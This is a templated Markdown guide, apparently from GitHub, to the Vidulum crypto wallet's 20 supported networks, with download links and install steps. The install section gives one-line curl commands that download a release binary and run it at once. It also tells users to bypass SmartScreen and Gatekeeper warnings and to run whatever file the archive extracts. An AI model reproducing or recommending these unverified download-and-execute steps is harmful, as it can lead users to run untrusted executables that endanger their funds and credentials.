![Vidulum](../assets/banner-article.png)

# Vidulum Multichain Wallet: Cosmos, UTXO, EVM and Solana

The full network table, what IBC changes, and what is deliberately switched off.

## Downloads - v2.2.1

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`vidulum-wallet-desktop-win-v2.2.1.exe`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`vidulum-wallet-desktop-macos-v2.2.1.dmg`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`vidulum-wallet-desktop-linux-v2.2.1.zip`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip) |

The [current Vidulum release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1) is where the network list below ships.

> A network list is a statement of what you can hold, not a promise about what you can swap into.

Vidulum covers 20 networks across four families: four Cosmos chains, nine UTXO chains, six EVM chains and Solana mainnet. Addresses, fees and transaction behaviour differ by family. The material behind this page documents holding, sending and receiving on those chains; it documents no swap route between them, so none is described here. This page is the reference table the other guides point at.

<!-- ARTICLE-BODY-BEGIN -->

## The network table

| Family | Network | Chain ID or ticker |
| --- | --- | --- |
| Cosmos | Cosmos Hub | cosmoshub-4 / ATOM |
| Cosmos | Osmosis | osmosis-1 / OSMO |
| Cosmos | BeeZee | beezee-1 / BZE |
| Cosmos | AtomOne | atomone-1 / ATONE |
| UTXO | Bitcoin | BTC |
| UTXO | Litecoin | LTC |
| UTXO | Dogecoin | DOGE |
| UTXO | Zcash | ZEC |
| UTXO | Flux | FLUX |
| UTXO | Ravencoin | RVN |
| UTXO | Ritocoin | RITO |
| UTXO | BitcoinZ | BTCZ |
| UTXO | NOSO | NOSO |
| EVM | Ethereum | ETH |
| EVM | OP Mainnet | OP |
| EVM | BNB Chain | BNB |
| EVM | Polygon | POL |
| EVM | Base | ETH on Base |
| EVM | Arbitrum One | ETH on Arbitrum |
| Solana | Solana mainnet | SOL |

Solana devnet and testnet are defined in the software but disabled. They are not usable networks, and this table does not count them.

## What IBC changes

IBC is the Cosmos-native transfer protocol. It moves assets between Cosmos chains without a wrapped token, and it is the correct route for ATOM, OSMO, BZE and ATONE between each other.

It is not a bridge to the rest of the list. Moving value from Cosmos to an EVM chain is a swap, not an IBC transfer, and the two have different risk profiles: IBC keeps the asset native, a swap changes it.

## How the families differ in handling

- **UTXO:** balances are sets of outputs; the fee is paid in the same coin; change comes back to a fresh address.
- **Cosmos:** account addresses per chain; fees in the chain's own token; IBC for cross-chain movement.
- **EVM:** one address format shared by six chains, so the chain must be chosen explicitly every time; gas in the chain's native coin.
- **Solana:** its own address format and fee model; mainnet only.

The EVM family is where mistakes are easiest, because the address gives no hint about which of the six chains it belongs to.

Flux is covered in its own guide, <a href="https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-flux-wallet-self-custody-desktop.md">Vidulum Wallet as a Flux alternative</a>.

## What the list does not cover

The 20 rows above are what the wallet's documentation lists. Anything outside them sits outside that documented coverage: assets a third-party site might list, coins on test networks, and chains added by other wallets. If you received an asset on a chain the documentation does not name, treat it as unsupported until the project says otherwise, and plan to handle that balance in software that supports the chain.

Cosmos delegation is covered in <a href="https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-cosmos-wallet-staking-atom-osmo-bze.md">Vidulum Wallet Cosmos staking</a>, which sets out the four chains.

If you are comparing desktop wallets, <a href="https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-exodus-alternative-desktop-custody.md">Vidulum Wallet as an Exodus alternative</a> covers what a restore-based move involves.

The table above ships with the <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1">Vidulum Wallet v2.2.1 release</a> and is the reference copy.

## FAQ

### How many networks is that in total?

Twenty: four Cosmos, nine UTXO, six EVM and Solana.

### Can I swap between any two of them?

The material behind this page documents no swap route, so this page describes none. Holding, sending and receiving on a listed chain is what it does document.

### Why do two EVM chains show the same address?

Because EVM chains share an address format. The chain is a separate choice from the address.

### Are the Solana test networks available?

They are defined but disabled, so they are not usable.

<!-- ARTICLE-BODY-END -->

## How to install Vidulum

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe">vidulum-wallet-desktop-win-v2.2.1.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg">vidulum-wallet-desktop-macos-v2.2.1.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip && unzip -o wallet.zip -d vidulum-linux && chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip">vidulum-wallet-desktop-linux-v2.2.1.zip</a>.
2. Extract the archive: `unzip -o wallet.zip -d vidulum-linux`.
3. Make it executable and run it: `chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop`.
4. If the archive extracts a differently named program or a folder of its own, run that file instead: the ZIP is the download, not the program.
<!-- INSTALL-END -->

## Related guides

[20 networks from one recovery phrase](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-20-networks-one-recovery-phrase.md) - [Cosmos staking](https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-cosmos-wallet-staking-atom-osmo-bze.md) - [Flux wallet](https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-flux-wallet-self-custody-desktop.md) - [Current release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1)
